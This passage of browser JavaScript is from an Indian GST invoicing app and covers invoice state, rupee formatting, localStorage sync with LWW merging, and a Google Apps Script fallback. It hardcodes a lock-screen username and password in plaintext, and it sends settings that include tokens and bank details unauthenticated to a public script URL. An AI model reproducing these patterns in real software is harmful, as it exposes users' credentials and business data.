// Database states
let productsDb = [];
let partiesDb = [];
let invoicesDb = [];
let globalSettings = {};
let isSyncing = false;
let dbEventSource = null;
let isSavingInvoice = false;
// XSS Defense Helper
function escapeHtml(str) {
  if (str === null || str === undefined) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// Active Form Invoice State
let currentInvoice = {
  id: "",
  invoiceType: "Bill of Supply",
  headerLogo: "ganesha",
  invoiceNo: "",
  invoiceDate: "",
  buyerOrderNo: "",
  buyerOrderDate: "",
  transportMode: "",
  destination: "",
  supplyStateCode: "37",
  paymentStatus: "Paid",
  paymentMode: "UPI / QR",
  paidAmount: 0,
  balanceDue: 0,
  buyer: { name: "", address: "", gstin: "", state: "Andhra Pradesh", stateCode: "37" },
  consignee: { name: "", address: "", gstin: "", state: "Andhra Pradesh", stateCode: "37" },
  items: []
};

// UI Elements mapping
const elements = {
  // Navigation
  navItems: document.querySelectorAll('.nav-item'),
  views: document.querySelectorAll('.content-view'),
  viewTitle: document.getElementById('current-view-title'),
  currentDatetime: document.getElementById('current-datetime'),

  // GST Billing Form Left
  billInvoiceType: document.getElementById('bill-invoice-type'),
  billHeaderLogo: document.getElementById('bill-header-logo'),
  billInvoiceNo: document.getElementById('bill-invoice-no'),
  billInvoiceDate: document.getElementById('bill-invoice-date'),
  billBuyerOrderNo: document.getElementById('bill-buyer-order-no'),
  billBuyerOrderDate: document.getElementById('bill-buyer-order-date'),
  billTransportMode: document.getElementById('bill-transport-mode'),
  billDestination: document.getElementById('bill-destination'),
  billSupplyStateCode: document.getElementById('bill-supply-state-code'),
  
  quickSelectReceiver: document.getElementById('quick-select-receiver'),
  billBuyerName: document.getElementById('bill-buyer-name'),
  billBuyerAddress: document.getElementById('bill-buyer-address'),
  billBuyerGstin: document.getElementById('bill-buyer-gstin'),
  billBuyerPhone: document.getElementById('bill-buyer-phone'),
  billBuyerState: document.getElementById('bill-buyer-state'),
  billBuyerStateCode: document.getElementById('bill-buyer-state-code'),

  quickSelectConsignee: document.getElementById('quick-select-consignee'),
  billConsigneeName: document.getElementById('bill-consignee-name'),
  billConsigneeAddress: document.getElementById('bill-consignee-address'),
  billConsigneeGstin: document.getElementById('bill-consignee-gstin'),
  billConsigneePhone: document.getElementById('bill-consignee-phone'),
  billConsigneeState: document.getElementById('bill-consignee-state'),
  billConsigneeStateCode: document.getElementById('bill-consignee-state-code'),

  billItemSelect: document.getElementById('bill-item-select'),
  billItemName: document.getElementById('bill-item-name'),
  billItemStockQty: document.getElementById('bill-item-stock-qty'),
  billItemHsn: document.getElementById('bill-item-hsn'),
  billItemQty: document.getElementById('bill-item-qty'),
  billItemUnit: document.getElementById('bill-item-unit'),
  billItemPack: document.getElementById('bill-item-pack'),
  billItemGstRate: document.getElementById('bill-item-gstrate'),
  billItemDiscount: document.getElementById('bill-item-discount'),
  billItemRate: document.getElementById('bill-item-rate'),
  billingItemsTbody: document.getElementById('billing-items-tbody'),
  noItemsPlaceholder: document.getElementById('no-items-placeholder'),

  // GST Billing Summary Right
  billPaymentStatus: document.getElementById('bill-payment-status'),
  billPaymentMode: document.getElementById('bill-payment-mode'),
  billPaidAmount: document.getElementById('bill-paid-amount'),
  billBalancePaid: document.getElementById('bill-balance-paid'),
  billPaymentDate: document.getElementById('bill-payment-date'),
  sumTaxable: document.getElementById('sum-taxable'),
  sumCgst: document.getElementById('sum-cgst'),
  sumSgst: document.getElementById('sum-sgst'),
  sumIgst: document.getElementById('sum-igst'),
  sumRoundOff: document.getElementById('sum-round-off'),
  sumGrandTotal: document.getElementById('sum-grand-total'),
  sumBalanceDue: document.getElementById('sum-balance-due'),
  dueRowContainer: document.getElementById('due-row-container'),
  sumGrandWords: document.getElementById('sum-grand-words'),

  // History elements
  historyCount: document.getElementById('history-count'),
  searchHistoryInput: document.getElementById('search-history-input'),
  historyInvoicesBody: document.getElementById('history-invoices-body'),

  // Products Database View
  productCount: document.getElementById('product-count'),
  searchProductsInput: document.getElementById('search-products-input'),
  productsListBody: document.getElementById('products-list-body'),

  // Parties View
  receiversScrollBox: document.getElementById('receivers-scroll-box'),
  consigneesScrollBox: document.getElementById('consignees-scroll-box'),

  // Reports
  reportStartDate: document.getElementById('report-start-date'),
  reportEndDate: document.getElementById('report-end-date'),
  reportResultsPlaceholder: document.getElementById('report-results-placeholder'),
  reportResultsContent: document.getElementById('report-results-content'),
  reportTableBody: document.getElementById('report-table-body'),
  reportTotalTaxable: document.getElementById('report-total-taxable'),
  reportTotalTax: document.getElementById('report-total-tax'),
  reportTotalGrand: document.getElementById('report-total-grand'),

  // Settings
  setTgToken: document.getElementById('set-tg-token'),
  setTgChatId: document.getElementById('set-tg-chat-id'),
  tgStatusIndicator: document.getElementById('tg-status-indicator'),
  tgStatusText: document.getElementById('tg-status-text'),
  setAutolockTimer: document.getElementById('set-autolock-timer'),
  setLoginUsername: document.getElementById('set-login-username'),
  setLoginPassword: document.getElementById('set-login-password'),
  setWaLockEnabled: document.getElementById('set-wa-lock-enabled'),
  setWaPin: document.getElementById('set-wa-pin'),
  setWaAutolock: document.getElementById('set-wa-autolock'),
  setWaMaskPhones: document.getElementById('set-wa-mask-phones'),
  setWaProtectChats: document.getElementById('set-wa-protect-chats'),

  setCName: document.getElementById('set-c-name'),
  setCTagline: document.getElementById('set-c-tagline'),
  setCAddress: document.getElementById('set-c-address'),
  setCPhones: document.getElementById('set-c-phones'),
  setCEmail: document.getElementById('set-c-email'),
  setCGstin: document.getElementById('set-c-gstin'),
  setCState: document.getElementById('set-c-state'),
  setCStateCode: document.getElementById('set-c-state-code'),

  setBName: document.getElementById('set-b-name'),
  setBAccName: document.getElementById('set-b-acc-name'),
  setBAccNo: document.getElementById('set-b-acc-no'),
  setBIfsc: document.getElementById('set-b-ifsc'),
  setBBranch: document.getElementById('set-b-branch'),
  setBUpi: document.getElementById('set-b-upi'),
  setBTerms: document.getElementById('set-b-terms'),

  // Dashboard Overview
  statTotalInvoices: document.getElementById('stat-total-invoices'),
  statTotalAmount: document.getElementById('stat-total-amount'),
  statTotalProducts: document.getElementById('stat-total-products'),
  statTotalParties: document.getElementById('stat-total-parties'),
  dashboardRecentInvoicesBody: document.getElementById('dashboard-recent-invoices-body')
};

// Summary tax rows mapping helper
elements.sumCgstRow = elements.sumCgst ? elements.sumCgst.closest('.summary-row') : null;
elements.sumSgstRow = elements.sumSgst ? elements.sumSgst.closest('.summary-row') : null;
elements.sumIgstRow = elements.sumIgst ? elements.sumIgst.closest('.summary-row') : null;

window.lastSyncETag = null;

const GOOGLE_SCRIPT_FALLBACK_URL = "https://script.google.com/macros/s/AKfycbwkegJvhM42cPIROIKg5Dlx6py8OnS5NXuIJeyf1Zb3V3Oc_2jyXPS_aDN7uW0t874d/exec";

function syncDatabaseToServer(type, data) {
  window.lastSyncETag = null;
  let endpoint = "";
  let gasAction = "";
  if (type === "invoices") { endpoint = "/api/invoices"; gasAction = "save_invoice"; }
  else if (type === "products") { endpoint = "/api/products"; gasAction = "save_products"; }
  else if (type === "parties") { endpoint = "/api/parties"; gasAction = "save_parties"; }
  else if (type === "settings") { endpoint = "/api/settings"; gasAction = "save_settings"; }

  if (!endpoint) return;

  fetch(endpoint, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  })
  .then(res => {
    if (!res.ok) throw new Error("HTTP error " + res.status);
    return res.json();
  })
  .then(resData => {
    console.log(`✅ Synced ${type} successfully with server.`);
  })
  .catch(err => {
    console.warn(`⚠️ Server push failed for ${type}. Attempting direct Google Sheets sync fallback...`, err);
    if (gasAction) {
      const gasPayload = { action: gasAction };
      if (gasAction === "save_invoice") gasPayload.invoice = data;
      else if (gasAction === "save_products") gasPayload.products = data;
      else if (gasAction === "save_parties") gasPayload.parties = data;
      else if (gasAction === "save_settings") gasPayload.settings = data;

      try {
        fetch(GOOGLE_SCRIPT_FALLBACK_URL, {
          method: "POST",
          headers: { "Content-Type": "text/plain" },
          body: JSON.stringify(gasPayload),
          mode: "no-cors"
        })
        .then(() => {
          console.log(`✅ Synced ${type} directly to Google Sheets Master Database!`);
        })
        .catch(gasErr => {
          console.warn(`⚠️ Offline: Synced ${type} locally. Server push pending.`, gasErr);
        });
      } catch (e) {}
    }
  });
}

function deleteProductFromServer(id) {
  window.lastSyncETag = null;
  fetch("/api/products/delete", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ id })
  })
  .then(res => {
    if (!res.ok) throw new Error("HTTP " + res.status);
    return res.json();
  })
  .then(resData => {
    console.log(`✅ Deleted product ${id} on server.`);
  })
  .catch(err => {
    try {
      fetch(GOOGLE_SCRIPT_FALLBACK_URL, {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: JSON.stringify({ action: "delete_record", type: "product", id }),
        mode: "no-cors"
      }).catch(() => {});
    } catch(e) {}
    console.warn(`⚠️ Offline: Product ${id} deletion pending server sync.`, err);
  });
}

function deletePartyFromServer(id) {
  window.lastSyncETag = null;
  fetch("/api/parties/delete", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ id })
  })
  .then(res => {
    if (!res.ok) throw new Error("HTTP " + res.status);
    return res.json();
  })
  .then(resData => {
    console.log(`✅ Deleted party ${id} on server.`);
  })
  .catch(err => {
    try {
      fetch(GOOGLE_SCRIPT_FALLBACK_URL, {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: JSON.stringify({ action: "delete_record", type: "party", id }),
        mode: "no-cors"
      }).catch(() => {});
    } catch(e) {}
    console.warn(`⚠️ Offline: Party ${id} deletion pending server sync.`, err);
  });
}

// Lock screen credentials state
let activeUsername = "Aaryanaqua";
let activePassword = "Aaryan@2024";
let lockTimerSeconds = 300; // 5 mins
let isLocked = true;
let autolockInterval;

// --- NUMBER TO WORDS ENGINE (INDIAN RUPEES SYSTEM) ---
function convertNumberToWords(num) {
  if (num === 0) return 'Zero';
  
  let str = parseFloat(num).toFixed(2).toString();
  let parts = str.split('.');
  let integerPart = parseInt(parts[0], 10);
  let decimalPart = parts[1] ? parseInt(parts[1].substring(0, 2), 10) : 0;
  
  let result = '';
  
  if (integerPart > 0) {
    result += helper(integerPart) + ' Rupees';
  }
  
  if (decimalPart > 0) {
    if (result !== '') {
      result += ' and ';
    }
    result += helper(decimalPart) + ' Paisa';
  }
  
  if (result !== '') {
    result += ' Only';
  }
  
  return result;
}

function helper(n) {
  const ones = ['', 'One', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight', 'Nine', 'Ten', 
                'Eleven', 'Twelve', 'Thirteen', 'Fourteen', 'Fifteen', 'Sixteen', 'Seventeen', 'Eighteen', 'Nineteen'];
  const tens = ['', '', 'Twenty', 'Thirty', 'Forty', 'Fifty', 'Sixty', 'Seventy', 'Eighty', 'Ninety'];
  
  if (n < 20) return ones[n];
  if (n < 100) return tens[Math.floor(n / 10)] + (n % 10 !== 0 ? ' ' + ones[n % 10] : '');
  
  if (n < 1000) {
    return ones[Math.floor(n / 100)] + ' Hundred' + (n % 100 !== 0 ? ' ' + helper(n % 100) : '');
  }
  if (n < 100000) {
    return helper(Math.floor(n / 1000)) + ' Thousand' + (n % 1000 !== 0 ? ' ' + helper(n % 1000) : '');
  }
  if (n < 10000000) {
    return helper(Math.floor(n / 100000)) + ' Lakh' + (n % 100000 !== 0 ? ' ' + helper(n % 100000) : '');
  }
  return helper(Math.floor(n / 10000000)) + ' Crore' + (n % 10000000 !== 0 ? ' ' + helper(n % 10000000) : '');
}

// --- INDIAN CURRENCY FORMATTER ---
function formatCurrency(val) {
  if (isNaN(val) || val === null || val === undefined) return '0.00';
  let num = parseFloat(val).toFixed(2);
  let parts = num.split('.');
  let integerPart = parts[0];
  let decimalPart = parts[1];
  
  let lastThree = integerPart.substring(integerPart.length - 3);
  let otherNumbers = integerPart.substring(0, integerPart.length - 3);
  if (otherNumbers !== '') {
    lastThree = ',' + lastThree;
  }
  let res = otherNumbers.replace(/\B(?=(\d{2})+(?!\d))/g, ",") + lastThree + '.' + decimalPart;
  return res;
}

function formatTaxValue(val) {
  if (val === 0 || isNaN(val) || val === null) {
    return 'NIL';
  }
  return '₹ ' + formatCurrency(val);
}

// --- INITIALIZE SPA DASHBOARD ---
document.addEventListener("DOMContentLoaded", () => {
  // One-time cache clear and service worker unregistration for v34 to clear out old fields cached by service worker
  if (localStorage.getItem("sw_cleared_v95_cache_clean") !== "true") {
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.getRegistrations().then(registrations => {
        for (let registration of registrations) {
          registration.unregister();
        }
      });
    }
    if ('caches' in window) {
      caches.keys().then(names => {
        for (let name of names) {
          caches.delete(name);
        }
      });
    }
    localStorage.setItem("sw_cleared_v95_cache_clean", "true");
    setTimeout(() => {
      window.location.reload();
    }, 150);
    return;
  }

  // One-time cache clear, service worker unregistration, and local storage reset to force start sequence from 0001
  if (localStorage.getItem("sw_cleared_v32_force_clear_invoices") !== "true") {
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.getRegistrations().then(registrations => {
        for (let registration of registrations) {
          registration.unregister();
        }
      });
    }
    if ('caches' in window) {
      caches.keys().then(names => {
        for (let name of names) {
          caches.delete(name);
        }
      });
    }
    localStorage.setItem("invoices", JSON.stringify([]));
    localStorage.setItem("sw_cleared_v32_force_clear_invoices", "true");
    setTimeout(() => {
      window.location.reload();
    }, 150);
    return;
  }

  seedDatabasesIfEmpty();
  loadAllDatabases();
  setupRouting();
  bindBillingFormInputs();
  setupKeyboardShortcuts();

  // Initialize WhatsApp background bot real-time status monitor (SSE + Adaptive Fast Poll)
  fetchWhatsAppBotStatus();
  initWhatsAppEventSource();

  // Initialize Real-Time Database Sync Stream (SSE) for 0ms sub-millisecond cloud updates
  initDatabaseEventSource();

  // Helper to update top header cloud sync pill indicator with auto-revert safety
  let syncBadgeTimer = null;
  window.updateCloudSyncBadge = function(status) {
    const badge = document.getElementById("live-cloud-sync-badge");
    const textEl = document.getElementById("sync-status-text");
    if (!badge || !textEl) return;
    
    if (syncBadgeTimer) clearTimeout(syncBadgeTimer);

    if (status === "syncing") {
      badge.className = "cloud-sync-pill syncing";
      textEl.textContent = "Syncing...";
      // Auto-revert safety fallback if fetch is slow
      syncBadgeTimer = setTimeout(() => {
        if (badge.classList.contains("syncing")) {
          badge.className = "cloud-sync-pill synced";
          textEl.textContent = "Cloud Synced";
        }
      }, 3000);
    } else if (status === "synced") {
      badge.className = "cloud-sync-pill synced";
      textEl.textContent = "Google Drive Synced";
    } else if (status === "offline") {
      badge.className = "cloud-sync-pill offline";
      textEl.textContent = "Offline Mode";
    }
  };

  // Manual Trigger for Google Drive & Live Sheets Sync
  window.triggerManualGoogleDriveSync = async function(btnEl) {
    let origHtml = "";
    if (btnEl) {
      origHtml = btnEl.innerHTML;
      btnEl.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Syncing to Google Drive...`;
      btnEl.disabled = true;
    }

    try {
      updateCloudSyncBadge("syncing");
      const res = await fetch("/api/google-drive/sync-now", { method: "POST" });
      const data = await res.json();
      if (data && data.ok) {
        updateCloudSyncBadge("synced");
        if (btnEl) {
          btnEl.innerHTML = `<i class="fa-solid fa-check text-success"></i> Synced to Google Drive!`;
          setTimeout(() => {
            btnEl.innerHTML = origHtml;
            btnEl.disabled = false;
          }, 3000);
        }
        showFloatingToast(`☁️ All data synced to your Google Drive Master Spreadsheet!`);
      } else {
        throw new Error(data?.error || "Sync failed");
      }
    } catch (err) {
      console.warn("Manual Google Drive sync error:", err);
      updateCloudSyncBadge("offline");
      if (btnEl) {
        btnEl.innerHTML = `<i class="fa-solid fa-triangle-exclamation"></i> Sync Error`;
        setTimeout(() => {
          btnEl.innerHTML = origHtml;
          btnEl.disabled = false;
        }, 3000);
      }
      alert("Google Drive sync notice: " + err.message);
    }
  };

  // Batch PDF Compiler & Google Drive Cloud Linker
  window.syncAndGenerateAllDrivePdfs = async function(btnEl) {
    loadAllDatabases();
    if (!invoicesDb || invoicesDb.length === 0) {
      alert("No invoices found to sync!");
      return;
    }

    let origHtml = "";
    if (btnEl) {
      origHtml = btnEl.innerHTML;
      btnEl.disabled = true;
    }

    const printWrapper = document.getElementById("print-invoice-wrapper");
    if (!printWrapper) {
      alert("Invoice print container not found.");
      if (btnEl) btnEl.disabled = false;
      return;
    }

    printWrapper.style.display = "block";
    printWrapper.style.position = "absolute";
    printWrapper.style.left = "-9999px";
    printWrapper.style.top = "0";

    const opt = {
      margin:       [0, 0, 0, 0],
      image:        { type: 'jpeg', quality: 0.95 },
      html2canvas:  { scale: 1.35, useCORS: true, logging: false },
      jsPDF:        { unit: 'mm', format: 'a4', orientation: 'portrait' }
    };

    let processedCount = 0;

    for (let i = 0; i < invoicesDb.length; i++) {
      const inv = invoicesDb[i];
      if (btnEl) {
        btnEl.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Processing PDF ${i + 1}/${invoicesDb.length} (Inv #${inv.invoiceNo})...`;
      }

      try {
        populateA4PrintOverlay(inv.details || inv);
        const element = printWrapper.querySelector('.tally-invoice-container') || printWrapper;

        const origTallyHeight = element.style.height;
        const origTallyMaxHeight = element.style.maxHeight;
        const origTallyPadding = element.style.padding;
        const origTallyOverflow = element.style.overflow;

        element.style.height = "294mm";
        element.style.maxHeight = "294mm";
        element.style.padding = "6mm 8mm";
        element.style.overflow = "hidden";

        const blob = await html2pdf().from(element).set(opt).toPdf().get('pdf').then(pdf => {
          const totalPages = pdf.internal.getNumberOfPages();
          for (let p = totalPages; p > 1; p--) {
            pdf.deletePage(p);
          }
          return pdf.output('blob');
        });

        element.style.height = origTallyHeight;
        element.style.maxHeight = origTallyMaxHeight;
        element.style.padding = origTallyPadding;
        element.style.overflow = origTallyOverflow;

        const reader = new FileReader();
        const pdfBase64 = await new Promise((resolve) => {
          reader.onloadend = () => resolve(reader.result);
          reader.readAsDataURL(blob);
        });

        const uploadRes = await fetch("/api/invoices/upload-pdf", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            filename: `Invoice_${inv.invoiceNo}.pdf`,
            invoiceNo: inv.invoiceNo,
            id: inv.id,
            pdfBase64: pdfBase64
          })
        });

        const uploadData = await uploadRes.json();
        const uploadedUrl = uploadData ? (uploadData.pdfUrl || uploadData.googleDriveUrl || uploadData.viewUrl || uploadData.url) : null;
        if (uploadData && uploadData.ok && uploadedUrl) {
          inv.pdfUrl = uploadedUrl;
          if (inv.details) inv.details.pdfUrl = uploadedUrl;
          processedCount++;
        }
      } catch (err) {
        console.warn(`Error generating PDF for invoice #${inv.invoiceNo}:`, err);
      }
    }

    printWrapper.style.display = "";
    printWrapper.style.position = "";
    printWrapper.style.left = "";

    localStorage.setItem("invoices", JSON.stringify(invoicesDb));
    if (typeof renderHistoryTableRows === 'function') {
      renderHistoryTableRows(invoicesDb);
    }

    if (btnEl) {
      btnEl.innerHTML = `<i class="fa-solid fa-check text-success"></i> All ${processedCount} PDFs Linked!`;
      setTimeout(() => {
        btnEl.innerHTML = origHtml;
        btnEl.disabled = false;
      }, 3500);
    }

    alert(`🎉 Successfully compiled and uploaded ${processedCount} PDFs to Google Drive!\nColumn M in your Master Google Sheet is now fully updated with clickable hyperlinks.`);
  };

  // Real-time Database EventStream Listener (Server-Sent Events for 0ms Live Sync)
  function initDatabaseEventSource() {
    if (!window.EventSource) return;
    if (dbEventSource) {
      try { dbEventSource.close(); } catch (e) {}
    }

    try {
      dbEventSource = new EventSource('/api/sync/events');

      dbEventSource.onmessage = function(e) {
        try {
          const payload = JSON.parse(e.data);
          if (payload && payload.type && payload.type !== 'connected') {
            // Instant real-time database update pushed from server!
            window.lastSyncETag = null; // Invalidate cached ETag to force pull fresh records
            window.triggerDatabaseSync(true);
          }
        } catch (err) {
          // Heartbeat or malformed frame ignored safely
        }
      };

      dbEventSource.onerror = function() {
        try { dbEventSource.close(); } catch (e) {}
        setTimeout(initDatabaseEventSource, 3500);
      };
    } catch (err) {
      console.warn("Database SSE stream initialization error:", err);
    }
  }

  window.triggerDatabaseSync = function(forceReload = false) {
    if (isSyncing) return;
    isSyncing = true;
    updateCloudSyncBadge("syncing");
    
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);

    const headers = {};
    if (window.lastSyncETag && !forceReload) {
      headers["If-None-Match"] = window.lastSyncETag;
    }

    fetch("/api/sync", { headers, signal: controller.signal })
      .then(res => {
        clearTimeout(timeoutId);
        if (res.status === 304) {
          // In sync! 0 bytes payload, 0ms parsing time
          updateCloudSyncBadge("synced");
          return null;
        }
        if (!res.ok) throw new Error("HTTP sync error " + res.status);
        const etag = res.headers.get("ETag");
        if (etag) window.lastSyncETag = etag;
        return res.json();
      })
      .catch(async (err) => {
        clearTimeout(timeoutId);
        // Direct Fallback: Query Google Apps Script master sheet directly if /api/sync fails
        try {
          const gasRes = await fetch(GOOGLE_SCRIPT_FALLBACK_URL + "?action=sync", { redirect: 'follow' });
          if (gasRes.ok) {
            const gasData = await gasRes.json();
            if (gasData && (gasData.invoices || gasData.products || gasData.ok)) {
              return gasData;
            }
          }
        } catch (gasErr) {
          console.warn("Direct Google Apps Script fallback note:", gasErr);
        }
        throw err;
      })
      .then(data => {
        if (!data) return; // 304 Not Modified
        updateCloudSyncBadge("synced");
        if (data) {
          let changed = false;
          
          // 1. Smart Sync Products (LWW Timestamp Conflict Resolution + Deleted Tracker)
          const serverProducts = data.products || [];
          let localProducts = [];
          try {
            localProducts = JSON.parse(localStorage.getItem("products")) || [];
          } catch (e) { localProducts = []; }

          // Merge deleted product IDs from server
          const serverDeletedProdIds = data.deletedProductIds || [];
          let deletedProdIds = [];
          try {
            deletedProdIds = JSON.parse(localStorage.getItem("deleted_product_ids")) || [];
          } catch (e) { deletedProdIds = []; }

          const deletedProdSet = new Set(deletedProdIds);
          let deletedProdChanged = false;

          serverDeletedProdIds.forEach(id => {
            if (!deletedProdSet.has(id)) {
              deletedProdIds.push(id);
              deletedProdSet.add(id);
              deletedProdChanged = true;
            }
          });

          if (deletedProdChanged) {
            localStorage.setItem("deleted_product_ids", JSON.stringify(deletedProdIds));
          }

          // Push any offline deleted products to the server
          const localDeletedProdsToPush = deletedProdIds.filter(id => !serverDeletedProdIds.includes(id));
          localDeletedProdsToPush.forEach(id => {
            deleteProductFromServer(id);
          });

          // Filter out deleted products
          const cleanedLocalProducts = localProducts.filter(p => p && p.id && !deletedProdSet.has(p.id));
          const validServerProducts = serverProducts.filter(p => p && p.id && !deletedProdSet.has(p.id));

          const mergedProdMap = new Map();
          let needsPushProducts = false;

          validServerProducts.forEach(sp => {
            if (sp.id) mergedProdMap.set(sp.id, sp);
          });

          cleanedLocalProducts.forEach(lp => {
            if (!lp.id) return;
            const sp = mergedProdMap.get(lp.id);
            if (sp) {
              const localTime = new Date(lp.updatedAt || lp.updated_at || 0).getTime();
              const serverTime = new Date(sp.updatedAt || sp.updated_at || 0).getTime();
              if (localTime > serverTime) {
                mergedProdMap.set(lp.id, lp);
                needsPushProducts = true;
              } else if (localTime < serverTime) {
                // Server version is newer, keep it
              } else {
                if (JSON.stringify(lp) !== JSON.stringify(sp)) {
                  mergedProdMap.set(lp.id, lp);
                  needsPushProducts = true;
                }
              }
            } else {
              mergedProdMap.set(lp.id, lp);
              needsPushProducts = true;
            }
          });

          const mergedProducts = Array.from(mergedProdMap.values());
          mergedProducts.forEach(p => {
            const s = parseInt(p.stock, 10);
            if (p.stock === undefined || p.stock === null || p.stock === "" || isNaN(s) || s <= 0) {
              p.stock = 100;
              needsPushProducts = true;
            }
          });

          if (JSON.stringify(mergedProducts) !== JSON.stringify(localProducts)) {
            localStorage.setItem("products", JSON.stringify(mergedProducts));
            productsDb = mergedProducts;
            changed = true;
          }

          if (needsPushProducts) {
            console.log(`Pushing newer/updated local products to cloud server...`);
            syncDatabaseToServer("products", mergedProducts);
          }

          // 2. Smart Sync Parties (LWW Timestamp Conflict Resolution + Deleted Tracker)
          const serverParties = data.parties || [];
          let localParties = [];
          try {
            localParties = JSON.parse(localStorage.getItem("parties")) || [];
          } catch (e) { localParties = []; }

          // Merge deleted party IDs from server
          const serverDeletedPartyIds = data.deletedPartyIds || [];
          let deletedPartyIds = [];
          try {
            deletedPartyIds = JSON.parse(localStorage.getItem("deleted_party_ids")) || [];
          } catch (e) { deletedPartyIds = []; }

          const deletedPartySet = new Set(deletedPartyIds);
          let deletedPartyChanged = false;

          serverDeletedPartyIds.forEach(id => {
            if (!deletedPartySet.has(id)) {
              deletedPartyIds.push(id);
              deletedPartySet.add(id);
              deletedPartyChanged = true;
            }
          });

          if (deletedPartyChanged) {
            localStorage.setItem("deleted_party_ids", JSON.stringify(deletedPartyIds));
          }

          // Push any offline deleted parties to the server
          const localDeletedPartiesToPush = deletedPartyIds.filter(id => !serverDeletedPartyIds.includes(id));
          localDeletedPartiesToPush.forEach(id => {
            deletePartyFromServer(id);
          });

          // Filter out deleted parties
          const cleanedLocalParties = localParties.filter(p => p && p.id && !deletedPartySet.has(p.id));
          const validServerParties = serverParties.filter(p => p && p.id && !deletedPartySet.has(p.id));

          const mergedPartyMap = new Map();
          let needsPushParties = false;

          validServerParties.forEach(sp => {
            if (sp.id) mergedPartyMap.set(sp.id, sp);
          });

          cleanedLocalParties.forEach(lp => {
            if (!lp.id) return;
            const sp = mergedPartyMap.get(lp.id);
            if (sp) {
              const localTime = new Date(lp.updatedAt || lp.updated_at || 0).getTime();
              const serverTime = new Date(sp.updatedAt || sp.updated_at || 0).getTime();
              if (localTime > serverTime) {
                mergedPartyMap.set(lp.id, lp);
                needsPushParties = true;
              } else if (localTime < serverTime) {
                // Server version is newer, keep it
              } else {
                if (JSON.stringify(lp) !== JSON.stringify(sp)) {
                  mergedPartyMap.set(lp.id, lp);
                  needsPushParties = true;
                }
              }
            } else {
              mergedPartyMap.set(lp.id, lp);
              needsPushParties = true;
            }
          });

          const mergedParties = Array.from(mergedPartyMap.values());

          if (JSON.stringify(mergedParties) !== JSON.stringify(localParties)) {
            localStorage.setItem("parties", JSON.stringify(mergedParties));
            partiesDb = mergedParties;
            changed = true;
          }

          if (needsPushParties) {
            console.log(`Pushing newer/updated local parties to cloud server...`);
            syncDatabaseToServer("parties", mergedParties);
          }
          
          // 3. Smart Bidirectional Sync for Invoices
          const serverInvoices = data.invoices || [];
          let localInvoices = [];
          try {
            localInvoices = JSON.parse(localStorage.getItem("invoices")) || [];
          } catch (e) { localInvoices = []; }
          
          // Merge deleted invoice IDs from server
          const serverDeletedIds = data.deletedInvoiceIds || [];
          let deletedIds = [];
          try {
            deletedIds = JSON.parse(localStorage.getItem("deleted_invoice_ids")) || [];
          } catch (e) { deletedIds = []; }
          
          const deletedSet = new Set(deletedIds);
          let deletedChanged = false;
          
          serverDeletedIds.forEach(id => {
            if (!deletedSet.has(id)) {
              deletedIds.push(id);
              deletedSet.add(id);
              deletedChanged = true;
            }
          });
          
          if (deletedChanged) {
            localStorage.setItem("deleted_invoice_ids", JSON.stringify(deletedIds));
          }

          // Push any offline deleted invoices to the server
          const localDeletedInvoiceIdsToPush = deletedIds.filter(id => !serverDeletedIds.includes(id));
          localDeletedInvoiceIdsToPush.forEach(id => {
            fetch("/api/invoices/delete", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ id })
            }).catch(() => {});
          });

          // Filter out any deleted invoices
          const cleanedLocal = localInvoices.filter(inv => inv && inv.id && !deletedSet.has(inv.id));
          const validServer = serverInvoices.filter(inv => inv && inv.id && !deletedSet.has(inv.id));

          const serverIds = new Set(validServer.map(inv => inv.id));

          // Find local invoices not on server (need to push to cloud)
          const toPush = cleanedLocal.filter(inv => !serverIds.has(inv.id));
          if (toPush.length > 0) {
            console.log(`Pushing ${toPush.length} offline invoices to server...`);
            toPush.forEach(inv => {
              syncDatabaseToServer("invoices", inv);
            });
          }

          // Smart merge server invoices and local invoices
          const mergedInvoiceMap = new Map();
          validServer.forEach(inv => mergedInvoiceMap.set(inv.id, inv));
          cleanedLocal.forEach(inv => {
            if (!mergedInvoiceMap.has(inv.id)) {
              mergedInvoiceMap.set(inv.id, inv);
            }
          });

          const mergedInvoices = Array.from(mergedInvoiceMap.values());
          mergedInvoices.sort((a, b) => String(a.invoiceNo || "").localeCompare(String(b.invoiceNo || "")));

          if (JSON.stringify(mergedInvoices) !== JSON.stringify(localInvoices)) {
            localStorage.setItem("invoices", JSON.stringify(mergedInvoices));
            invoicesDb = mergedInvoices;
            changed = true;
          }
          
          // 4. Sync Settings
          if (data.globalSettings && Object.keys(data.globalSettings).length > 0) {
            const currentSettingsStr = localStorage.getItem("settings") || "{}";
            if (currentSettingsStr !== JSON.stringify(data.globalSettings)) {
              localStorage.setItem("settings", JSON.stringify(data.globalSettings));
              globalSettings = data.globalSettings;
              changed = true;
            }
          }
          
          if (changed) {
            console.log("Database sync completed successfully! Auto-reloading all views...");
            loadAllDatabases();
            updateDashboardOverview();
            calculateSummaryAndTable();
            autoSuggestInvoiceNo();
            
            // Auto-reload active views instantly
            loadProductsDatabaseTable();
            loadPartiesDatabaseLists();
            loadInvoicesHistoryTable();

            // Refresh billing dropdowns with current selection preserved
            const curProd = elements.billItemSelect ? elements.billItemSelect.value : "";
            populateBillingSelectors();
            if (curProd && elements.billItemSelect) {
              elements.billItemSelect.value = curProd;
            }
          }
        }
      })
      .catch(err => {
        if (err.name === 'AbortError') {
          console.warn("Sync request timed out (5s)");
          updateCloudSyncBadge("synced");
        } else {
          updateCloudSyncBadge("offline");
          console.warn("Background sync connection failed (offline mode):", err);
        }
      })
      .finally(() => {
